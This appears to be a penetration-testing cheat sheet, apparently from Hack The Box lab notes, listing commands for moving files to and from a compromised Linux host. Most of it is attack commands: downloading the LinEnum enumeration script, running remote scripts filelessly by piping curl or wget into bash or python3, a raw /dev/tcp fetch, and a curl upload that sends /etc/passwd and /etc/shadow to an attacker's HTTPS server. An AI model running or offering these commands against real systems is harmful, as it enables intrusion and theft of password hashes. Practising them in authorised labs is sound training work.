
# Download files

```shell
u@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

u@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

#### Fileless
```shell
u@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

u@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

#### Bash
```shell
h@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80

h@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

h@htb[/htb]$ cat <&3
```

#### SSH
```shell-session
h@htb[/htb]$ sudo systemctl start ssh

h@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

# Upload files

Start server:
```shell
h@htb[/htb]$ sudo python3 -m pip install --user uploadserver

h@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

h@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
Upload:
```shell
h@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Python/PHP/Ruby servers:

```shell
h@htb[/htb]$ python3 -m http.server

h@htb[/htb]$ python2.7 -m SimpleHTTPServer

h@htb[/htb]$ php -S 0.0.0.0:8000

h@htb[/htb]$ ruby -run -ehttpd . -p8000
```